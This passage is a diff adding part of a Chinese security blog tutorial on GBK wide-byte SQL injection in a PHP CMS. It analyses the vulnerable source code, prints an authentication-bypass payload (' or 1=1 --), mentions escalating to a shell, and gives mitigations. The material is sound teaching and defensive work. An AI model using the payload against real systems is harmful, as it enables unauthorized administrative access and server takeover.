+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysql</span>(<span class="params"><span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpw</span>, <span class="variable">$dbname</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$dbcharset</span> = <span class="string">&#x27;gbk&#x27;</span>, <span class="variable">$connect</span>=<span class="number">1</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="keyword">empty</span>(<span class="variable">$connect</span>) ? <span class="string">&#x27;mysql_pconnect&#x27;</span> : <span class="string">&#x27;mysql_connect&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;linkid = @<span class="variable">$func</span>(<span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpw</span>, <span class="literal">true</span>))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;dbshow(<span class="string">&#x27;Can not connect to Mysql!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;dbversion() &gt; <span class="string">&#x27;4.1&#x27;</span>)&#123;</span><br><span class="line">                mysql_query( <span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;dbversion() &gt; <span class="string">&#x27;5.0.1&#x27;</span>)&#123;</span><br><span class="line">                    mysql_query(<span class="string">&quot;SET sql_mode = &#x27;&#x27;&quot;</span>,<span class="keyword">$this</span>-&gt;linkid);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+
+<p>/include/common.inc.php文件中的mysql实例化对象，调用了这个mysql类，将数据库的连接信息进行封装，重点关注下mysql_query( “SET NAMES gbk”);这一句,使三个字符集（客户端、连接层、结果集）都是GBK编码，经过前面的讲解可以知道gbk是双字节，如果再使用了addslashes()等前面所说的函数进行转义操作，那么一定可以触发宽字节注入</p>
+<p>回到common.inc.php,看到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">   <span class="variable">$_POST</span> = deep_addslashes(<span class="variable">$_POST</span>);</span><br><span class="line">   <span class="variable">$_GET</span> = deep_addslashes(<span class="variable">$_GET</span>);</span><br><span class="line">   <span class="variable">$_COOKIES</span> = deep_addslashes(<span class="variable">$_COOKIES</span>);</span><br><span class="line">   <span class="variable">$_REQUEST</span> = deep_addslashes(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果没有开启get_magic_quotes_gpc(),则会对各种请求数据使deep_addslashes()进行过滤，跟进下这个函数，在common.fun.php文件中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deep_addslashes</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array(<span class="variable">$str</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$str</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$key</span>] = deep_addslashes(<span class="variable">$val</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$str</span> = addslashes(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不管是数组还是字符串都会调用addslashes()函数进行字符的转义</p>
+<p>至此可以确定能触发宽字节注入</p>
+<h4 id="4-3-2-sql语句分析"><a href="#4-3-2-sql语句分析" class="headerlink" title="4.3.2 sql语句分析"></a>4.3.2 sql语句分析</h4><p>前面已经构造了payload，现在看一看完整的sql语句</p>
+<p>admin/login.php源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(check_admin(<span class="variable">$admin_name</span>, <span class="variable">$admin_pwd</span>))&#123;</span><br><span class="line">        update_admin_info(<span class="variable">$admin_name</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$remember</span> == <span class="number">1</span>)&#123;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+
+<p>前面已经构造了payload，现在看一看完整的sql语句</p>
+<p>admin/login.php源码</p>
+<p>check_admin()函数使用了输入的用户名和密码，跟进一下</p>
+<p>该函数在include/common.fun.php文件中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_admin</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$pwd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$db</span>-&gt;getone(<span class="string">&quot;SELECT COUNT(*) AS num FROM &quot;</span>.table(<span class="string">&#x27;admin&#x27;</span>).<span class="string">&quot; WHERE admin_name=&#x27;<span class="subst">$name</span>&#x27; and pwd = md5(&#x27;<span class="subst">$pwd</span>&#x27;)&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;num&#x27;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>正常的sql语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> num <span class="keyword">FROM</span> blue_admin <span class="keyword">WHERE</span> admin_name<span class="operator">=</span><span class="string">&#x27;$name&#x27;</span> <span class="keyword">and</span> pwd <span class="operator">=</span> md5(<span class="string">&#x27;$pwd&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>当从blue_admin表中查到admin的信息，num的值就会大于零，这样就可以登录成功</p>
+<p>含有payload的sql语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*) <span class="keyword">AS</span> num <span class="keyword">FROM</span> blue_admin WHERE admin_name=<span class="string">&#x27;1 運&#x27;</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> -- <span class="string">&#x27; and pwd = md5(&#x27;</span><span class="variable">$pwd</span><span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+<p>登录后台管理，可以寻找上传点，或者利用已知的漏洞，从而getshell，进而控制整个服务器。</p>
+<h2 id="5-漏洞防护"><a href="#5-漏洞防护" class="headerlink" title="5. 漏洞防护"></a>5. 漏洞防护</h2><p>使用mysql_set_charset(GBK)指定字符集</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET character_set_connection&#x3D;gbk, character_set_results&#x3D;gbk,character_set_client&#x3D;binary</span><br></pre></td></tr></table></figure>
+<p>使用mysql_real_escape_string进行转义</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集（使用mysql_set_charset指定字符集），不会出现前面的df和5c拼接为一个宽字节的问题</span><br></pre></td></tr></table></figure>
+<p>以上两个条件需要同时满足才行，缺一不可。</p>
+<p>————————————<br>本文作者：Setup， 转载请注明来自(FreeBuf.COM)[<a target="_blank" rel="noopener" href="https://www.freebuf.com/]">https://www.freebuf.com/]</a></p>
 
     </div>
 
@@ -461,7 +586,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">1. 基本概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-SQL%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B"><span class="nav-text">2. SQL的执行过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-text">3. 宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%88%86%E6%9E%90"><span class="nav-text">4. 环境搭建及分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%AE%9E%E9%AA%8C1"><span class="nav-text">4.1 实验1</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">1. 基本概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-SQL%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B"><span class="nav-text">2. SQL的执行过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-text">3. 宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%88%86%E6%9E%90"><span class="nav-text">4. 环境搭建及分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%AE%9E%E9%AA%8C1"><span class="nav-text">4.1 实验1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-1-%E7%A1%AE%E5%AE%9A%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-text">4.1.1 确定注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-2-%E7%A1%AE%E5%AE%9A%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-text">4.1.2 确定表的字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-3-%E7%A1%AE%E5%AE%9A%E5%AD%97%E6%AE%B5%E7%9A%84%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="nav-text">4.1.3 确定字段的显示位</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-4-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="nav-text">4.1.4 获取当前数据库信息</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-text">1. 获取当前数据库名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E8%8E%B7%E5%8F%96test%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8%E4%BF%A1%E6%81%AF"><span class="nav-text">2. 获取test数据库中的表信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E8%8E%B7%E5%8F%96admin%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="nav-text">3. 获取admin表的字段</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E8%8E%B7%E5%8F%96-admin-%E8%A1%A8%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="nav-text">4. 获取 admin 表的数据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="nav-text">5. 获取当前用户信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-%E8%AF%BB%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6"><span class="nav-text">6. 读服务器中的文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E5%AE%9E%E9%AA%8C2"><span class="nav-text">4.2 实验2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-1-%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-text">4.2.1 注入点</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-%E5%AE%9E%E9%AA%8C3"><span class="nav-text">4.3 实验3</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-3-1-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">4.3.1 源码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-3-2-sql%E8%AF%AD%E5%8F%A5%E5%88%86%E6%9E%90"><span class="nav-text">4.3.2 sql语句分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4"><span class="nav-text">5. 漏洞防护</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -563,13 +688,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">139k</span>
+    <span title="站点总字数">148k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">2:06</span>
+    <span title="站点阅读时长">2:14</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
